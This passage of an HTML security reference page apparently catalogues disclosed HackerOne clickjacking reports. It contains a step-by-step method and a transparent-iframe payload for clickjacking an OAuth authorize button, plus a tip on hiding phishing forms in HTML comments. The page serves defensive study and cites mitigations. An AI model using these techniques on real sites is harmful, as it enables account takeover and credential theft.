+<p class="insight"><b>Insight —</b> Any app that renders user HTML/markdown in a trusted chrome (notes, comments, wikis, Electron apps) is a phishing surface even without JS: forms and iframes alone steal credentials. Test both raw &lt;form&gt; injection and &lt;iframe&gt; injection; hide the payload in HTML comments (visible in editor, stripped in preview) to make the note look benign. Electron apps should ship a CSP with frame-src/form-action locked down.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/289823" target="_blank" rel="noopener">hackerone.com/reports/289823</a></span><a class="src" href="#report-289823" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-65825" style="--sv:var(--sev-none)" data-sev="0" data-votes="15" data-bounty="5000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth authorize page clickjacking (missing X-Frame-Options)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#65825</b> · coinbase · USD 5000 · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>coinbase</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">OAuth-related responses omitted the X-Frame-Options (and framing) headers that the rest of the site set, so the 'Authorize' button could be framed and clickjacked into granting an app access.</p>
+<h4>Method</h4><ol><li>Frame the OAuth authorize/consent page in an iframe on an attacker page</li><li>Overlay/entice the victim to click the hidden Authorize button</li><li>OAuth grant completes, giving the attacker app access</li></ol>
+<div class="pre">&lt;iframe src="https://TARGET/oauth/authorize?client_id=&lt;attacker_app&gt;&amp;..." style="opacity:0"&gt;&lt;/iframe&gt;</div>
+<p class="insight"><b>Insight —</b> Framing protections are often applied globally but forgotten on OAuth/consent, SSO and other bolt-on flows; specifically test X-Frame-Options/CSP frame-ancestors on the authorize button.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/65825" target="_blank" rel="noopener">hackerone.com/reports/65825</a></span><a class="src" href="#report-65825" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">Clickjacking labs</a> (hands-on practice).</li>
+<li>All 20 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#transparent-overlay-clickjack" style="padding-left:24px">↳ Transparent-overlay clickjack</a><a href="#data-exfil-clickjack-autofill" style="padding-left:24px">↳ Data-exfil clickjack (autofill)</a><a href="#in-app-phishing-forms-iframes-no-js" style="padding-left:24px">↳ In-app phishing forms/iframes (no JS)</a><a href="#full-page-click-catcher" style="padding-left:24px">↳ Full-page click-catcher</a><a href="#doubleclickjacking-no-iframe" style="padding-left:24px">↳ DoubleClickjacking (no iframe)</a><a href="#reverse-tabnabbing" style="padding-left:24px">↳ Reverse tabnabbing</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (20)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/clickjacking" target="_blank" rel="noopener">⚑ PortSwigger: Clickjacking</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
